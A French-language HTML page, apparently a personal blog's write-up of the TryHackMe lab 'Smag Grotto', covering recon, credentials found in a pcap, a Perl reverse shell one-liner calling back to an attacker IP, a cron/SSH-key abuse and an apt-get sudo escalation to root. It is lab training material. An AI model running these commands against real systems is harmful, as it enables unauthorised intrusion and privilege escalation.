@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>THM: Smag Grotto Writeup | 0xMizu</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <link rel="stylesheet" href="../css/prism.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <nav class="nav">
+                <a href="../index.html" class="logo">0xmizu</a>
+                <div class="nav-links">
+                    <a href="/" class="nav-link active">Accueil</a>
+                    <a href="#writeups" class="nav-link">Writeups</a>
+                    <a href="#about" class="nav-link">À propos</a>
+                    <a href="#skills" class="nav-link">Skills</a>
+                    <a href="#projects" class="nav-link">Projects</a>
+                    <a href="#contact" class="nav-link">Contact</a>
+                </div>
+                <button class="theme-toggle" aria-label="Toggle theme">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </nav>
+        </header>
+
+        <main class="writeup-container">
+            <article class="writeup-content">
+                <header class="writeup-header">
+                    <img src="../images/d4071f466e055d38d5a169cae9f12b33.png" alt="Smag Grotto Banner" class="writeup-banner" style="width: 150px;">
+                    <div class="writeup-meta">
+                        <span class="difficulty easy">Facile</span>
+                        <span class="platform thm">TryHackMe</span>
+                        <span class="date">Juin 2020</span>
+                    </div>
+                    <h1>THM: Smag Grotto Writeup</h1>
+                    <div class="tags">
+                        <span class="tag">Web</span>
+                        <span class="tag">PrivEsc</span>
+                        <span class="tag">SSH</span>
+                        <span class="tag">Linux</span>
+                    </div>
+                </header>
+
+                <div class="writeup-body">
+                    <section id="introduction">
+                        <h2>Introduction</h2>
+                        <p>Smag Grotto est une machine Linux classée facile sur TryHackMe. Cette machine met en avant des failles courantes de configuration et d'autorisations, offrant une excellente opportunité pour pratiquer les techniques de base de pentest.</p>
+                        
+                        <div class="writeup-info">
+                            <div class="info-box">
+                                <h3>Informations</h3>
+                                <ul>
+                                    <li><strong>Plateforme:</strong> TryHackMe</li>
+                                    <li><strong>Difficulté:</strong> Facile</li>
+                                    <li><strong>Système:</strong> Linux (Ubuntu 16.04)</li>
+                                    <li><strong>Lien:</strong> <a href="https://tryhackme.com/room/smaggrotto" target="_blank">https://tryhackme.com/room/smaggrotto</a></li>
+                                </ul>
+                            </div>
+                            <div class="info-box">
+                                <h3>Outils utilisés</h3>
+                                <ul>
+                                    <li>Nmap</li>
+                                    <li>Dirb</li>
+                                    <li>Wireshark</li>
+                                    <li>Netcat</li>
+                                    <li>SSH</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </section>
+
+                    <section id="reconnaissance">
+                        <h2>Reconnaissance</h2>
+                        <p>Comme pour tout pentest, la première étape consiste à identifier les services exposés.</p>
+                        
+                        <h3>Scan Nmap</h3>
+                        <p>J'ai commencé par un scan complet des ports avec Nmap :</p>
+                        <div class="terminal">
+                            <div class="terminal-header">
+                                <span class="red-btn"></span>
+                                <span class="yellow-btn"></span>
+                                <span class="green-btn"></span>
+                            </div>
+                        <pre><code class="terminal-body">nmap -A -p- -oN nmapResults.txt 10.10.121.229</code></pre>
+                        
+                        <p>Résultats :</p>
+                        
+                        <pre><code class="terminal-body">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
+|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
+|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Smag
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+                        
+                        <p>Seuls les ports 22 (SSH) et 80 (HTTP) sont ouverts, ce qui limite les vecteurs d'attaque potentiels.</p>
+                    </section>
+
+                    <section id="enumeration-web">
+                        <h2>Énumération Web</h2>
+                        <p>Le site web principal affiche une simple page indiquant qu'il est en développement :</p>
+                        
+                        <div class="terminal">
+                            <div class="terminal-header">
+                                <span class="red-btn"></span>
+                                <span class="yellow-btn"></span>
+                                <span class="green-btn"></span>
+                            </div>
+                            <div class="website-output">
+                                <p>Welcome to Smag</p>
+                                <p>This website is under development</p>
+                            </div>
+                        </div>
+                        
+                        <h3>Scan de répertoires</h3>
+                        <p>J'ai lancé un scan Dirb pour découvrir des répertoires cachés :</p>
+                        
+                        <pre><code class="language-bash">dirb http://10.10.121.229/ -o dirbResult</code></pre>
+                        
+                        <p>Le scan a révélé un répertoire intéressant : <code>/mail/</code> contenant un fichier pcap.</p>
+                        
+                        <h3>Analyse du fichier pcap</h3>
+                        <p>Après avoir téléchargé le fichier, je l'ai analysé avec Wireshark et découvert :</p>
+                        
+                        <ul>
+                            <li>Un hostname : <code>development.smag.thm</code></li>
+                            <li>Des identifiants dans une requête POST vers <code>login.php</code></li>
+                        </ul>
+                        
+                        <p>J'ai ajouté le hostname à mon fichier <code>/etc/hosts</code> :</p>
+                        
+                        <pre><code class="language-bash">echo "10.10.121.229 development.smag.thm" | sudo tee -a /etc/hosts</code></pre>
+                    </section>
+
+                    <section id="exploitation">
+                        <h2>Exploitation</h2>
+                        <p>Le sous-domaine <code>development.smag.thm</code> révèle une section de développement avec deux pages :</p>
+                        
+                        <ul>
+                            <li><code>admin.php</code> - Redirige vers login.php si non authentifié</li>
+                            <li><code>login.php</code> - Formulaire de connexion</li>
+                        </ul>
+                        
+                        <h3>Connexion avec les identifiants trouvés</h3>
+                        <p>J'ai utilisé les identifiants extraits du pcap :</p>
+                        
+                        <div class="terminal">
+                            <div class="terminal-header">
+                                <span class="red-btn"></span>
+                                <span class="yellow-btn"></span>
+                                <span class="green-btn"></span>
+                            </div>
+                            <div class="command">
+                                <p>Username: jake@smag.thm</p>
+                                <p>Password: ********</p>
+                            </div>
+                        </div>
+                        
+                        <p>Après connexion, j'ai accédé à une interface de commande basique sur <code>admin.php</code>.</p>
+                        
+                        <h3>Obtention d'un reverse shell</h3>
+                        <p>L'interface permettait d'exécuter des commandes limitées. J'ai utilisé un reverse shell Perl :</p>
+                        
+                        <pre><code class="language-perl">perl -e 'use Socket;$i="10.14.32.60";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</code></pre>
+                        
+                        <p>Après avoir mis en place un listener Netcat, j'ai obtenu un shell en tant que <code>www-data</code>.</p>
+                    </section>
+
+                    <section id="post-exploitation">
+                        <h2>Post-Exploitation</h2>
+                        <p>Avec un accès initial, j'ai cherché à élever mes privilèges.</p>
+                        
+                        <h3>Énumération du système</h3>
+                        <p>J'ai examiné le fichier <code>/etc/passwd</code> et identifié un utilisateur <code>jake</code>.</p>
+                        
+                        <p>En inspectant le fichier <code>/etc/crontab</code>, j'ai remarqué une tâche intéressante :</p>
+                        
+                        <pre><code class="language-bash">*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys</code></pre>
+                        
+                        <h3>Exploitation de la tâche cron</h3>
+                        <p>Le fichier <code>/opt/.backups/jake_id_rsa.pub.backup</code> avait des permissions trop permissives :</p>
+                        
+                        <pre><code class="file-contents">ls -l /opt/.backups/jake_id_rsa.pub.backup</code></pre>
+                        <p></p>
+                        <p></p>
+                        <pre><code class="file-contents">-rw-rw-rw- 1 root root 563 Jun  5  2020 /opt/.backups/jake_id_rsa.pub.backup</code></pre>
+                        
+                        <p></p>
+
+                        <p>J'ai généré une nouvelle paire de clés SSH et copié ma clé publique dans le fichier :</p>
+                        
+                        <pre><code class="language-bash">echo 'ssh-rsa AAAAB3NzaC1...' > /opt/.backups/jake_id_rsa.pub.backup</code></pre>
+                        
+                        <p>Après quelques minutes, j'ai pu me connecter en SSH en tant que <code>jake</code> :</p>
+                        
+                        <pre><code class="language-bash">ssh -i id_rsa jake@10.10.121.229</code></pre>
+                    </section>
+
+                    <section id="privilege-escalation">
+                        <h2>Élévation de Privilèges</h2>
+                        <p>En tant que <code>jake</code>, j'ai vérifié les droits sudo :</p>
+                        
+                        <pre><code class="language-bash">sudo -l
+Matching Defaults entries for jake on smag:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jake may run the following commands on smag:
+    (ALL : ALL) NOPASSWD: /usr/bin/apt-get</code></pre>
+                        
+                        <h3>Exploitation de apt-get</h3>
+                        <p>J'ai utilisé la technique de GTFOBins pour obtenir un shell root :</p>
+                        
+                        <pre><code class="language-bash">sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh</code></pre>
+                        
+                        <p>Cette commande m'a donné un shell avec les privilèges root :</p>
+                        
+                        <div class="terminal">
+                            <div class="terminal-header">
+                                <span class="red-btn"></span>
+                                <span class="yellow-btn"></span>
+                                <span class="green-btn"></span>
+                            </div>
+                                <p># whoami</p>
+                                <p>root</p>
+                            </div>
+                        </div>
+                    </section>
+
+                    <section id="conclusion">
+                        <h2>Conclusion</h2>
+                        <h3>Points clés</h3>
+                        <p>Cette machine illustre plusieurs bonnes pratiques de sécurité à respecter :</p>
+                        
+                        <ul>
+                            <li><strong>Ne pas exposer de fichiers sensibles</strong> : Le pcap contenait des identifiants en clair</li>
+                            <li><strong>Permissions strictes</strong> : Le fichier de clé SSH avait des permissions trop permissives (rw-rw-rw-)</li>
+                            <li><strong>Principle of Least Privilege</strong> : L'utilisateur jake n'aurait pas dû avoir de droits sudo sur apt-get</li>
+                            <li><strong>Filtrage des commandes</strong> : L'interface web aurait dû restreindre les commandes exécutables</li>
+                        </ul>
+                        
+                        <h3>Flags</h3>
+                        <div class="flags">
+                            <div class="flag">
+                                <h4>User Flag</h4>
+                                <input type="text" value="THM{***********}" readonly>
+                                <button class="copy-btn">Copier</button>
+                            </div>
+                            <div class="flag">
+                                <h4>Root Flag</h4>
+                                <input type="text" value="THM{***********}" readonly>
+                                <button class="copy-btn">Copier</button>
+                            </div>
+                        </div>
+                    </section>
+                </div>
+            </article>
+        </main>
+
+        <footer class="footer">
+            <p class="copyright">© 2022-2025 0xMizu. Tous droits réservés.</p>
+        </footer>
+    </div>
+
+    <script src="../js/prism.js"></script>
+    <script src="../js/main.js"></script>
+</body>
+</html>
